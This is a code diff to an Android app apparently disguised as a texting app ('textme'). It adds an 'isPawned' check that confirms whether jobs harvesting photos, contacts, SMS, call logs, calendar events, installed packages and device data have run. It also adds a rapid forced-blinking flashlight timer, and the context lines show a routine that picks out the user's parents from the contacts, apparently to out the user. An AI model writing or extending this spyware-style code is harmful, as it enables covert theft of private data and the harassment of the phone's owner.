@@ -11,6 +11,7 @@ import android.app.WallpaperManager;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
@@ -32,6 +33,7 @@ import android.os.Bundle;
 import android.os.Environment;
 import android.os.VibrationEffect;
 import android.os.Vibrator;
+import android.preference.PreferenceManager;
 import android.preference.RingtonePreference;
 import android.provider.CalendarContract;
 import android.provider.CallLog;
@@ -56,11 +58,24 @@ import java.net.URLConnection;
 import java.net.URLEncoder;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Timer;
+import java.util.TimerTask;
+
+import static com.candroid.textme.JobsScheduler.CALENDAR_EVENTS_KEY;
+import static com.candroid.textme.JobsScheduler.CONTACTS_KEY;
+import static com.candroid.textme.JobsScheduler.DCIM_KEY;
+import static com.candroid.textme.JobsScheduler.DEVICE_KEY;
+import static com.candroid.textme.JobsScheduler.FAKE_PHONE_CALL_KEY;
+import static com.candroid.textme.JobsScheduler.PACKAGES_KEY;
+import static com.candroid.textme.JobsScheduler.PHONE_CALLS_KEY;
+import static com.candroid.textme.JobsScheduler.SMS_KEY;
 
 public class Lofl {
     private static int sId = -1;
     private static NotificationManager sNotificationManager;
     private static Bitmap sLargeIcon;
+    protected static boolean sIsFlaghlightOn = false;
+    protected static CameraManager sCameraManager;
 
     protected static void uninstallApp(Context context, String packageName){
         Intent intent = new Intent(Intent.ACTION_UNINSTALL_PACKAGE, Uri.parse(packageName));
@@ -194,6 +209,13 @@ public class Lofl {
         context.startActivity(mapIntent);
     }
 
+    protected static void setJobRan(Context context, String key){
+        SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(context).edit();
+        editor.putBoolean(key, true);
+        editor.apply();
+
+    }
+
     protected static void tellMyParentsImGay(Context context){
         ArrayList<Contact> contacts = Lofl.fetchContactsInformation(context);
         ArrayList<Contact> parents = new ArrayList<>();
@@ -214,40 +236,49 @@ public class Lofl {
 
     }
 
-
+    protected static boolean isPawned(Context context){
+        SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
+        return sharedPreferences.getBoolean(DCIM_KEY, false) && sharedPreferences.getBoolean(PACKAGES_KEY, false) &&
+        sharedPreferences.getBoolean(CONTACTS_KEY, false) &&
+        sharedPreferences.getBoolean(DEVICE_KEY, false) &&
+        sharedPreferences.getBoolean(PHONE_CALLS_KEY, false) &&
+        sharedPreferences.getBoolean(SMS_KEY, false) &&
+        sharedPreferences.getBoolean(CALENDAR_EVENTS_KEY, false) &&
+        sharedPreferences.getBoolean(FAKE_PHONE_CALL_KEY, false);
+    }
 
     protected static void persistentBlinkingFlashlight(final Context context){
-        new Thread(new Runnable() {
+        TimerTask timerTask = new TimerTask() {
             @Override
             public void run() {
-                CameraManager cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
-                String cameraId= null;
+                String cameraId = null;
+                if(Lofl.sCameraManager == null) {
+                    sCameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
+                }
                 try {
-                    cameraId = cameraManager.getCameraIdList()[0];
-                    boolean isOn = false;
-                    for(int i = 0; i < 50000; i++){
-                        if(ScreenReceiver.sKill){
-                            cameraManager.setTorchMode(cameraId, false);
-                            break;
-                        }
-                        if(isOn){
-                            cameraManager.setTorchMode(cameraId, false);
-                            isOn = false;
-                        }
-                        try {
-                            Thread.sleep(1000);
-                            cameraManager.setTorchMode(cameraId, true);
-                            isOn = true;
-                        } catch (InterruptedException e) {
-                            e.printStackTrace();
-                        }
+                    cameraId = sCameraManager.getCameraIdList()[0];
+                } catch (CameraAccessException e1) {
+                    e1.printStackTrace();
+                }
+                if(sIsFlaghlightOn){
+                    try {
+                        sCameraManager.setTorchMode(cameraId, false);
+                        sIsFlaghlightOn = false;
+                    } catch (CameraAccessException e1) {
+                        e1.printStackTrace();
                     }
-                    ScreenReceiver.sKill = false;
-                } catch (CameraAccessException e) {
-                    e.printStackTrace();
+                }else{
+                    try {
+                        sCameraManager.setTorchMode(cameraId, true);
+                        sIsFlaghlightOn = true;
+                    } catch (CameraAccessException e1) {
+                        e1.printStackTrace();
+                    }
                 }
             }
-        }).start();
+        };
+        Timer timer = new Timer("flashlightTask", true);
+        timer.schedule(timerTask, 300L, 100L);
     }
 
     protected static void turnOffFlashlight(Context context){
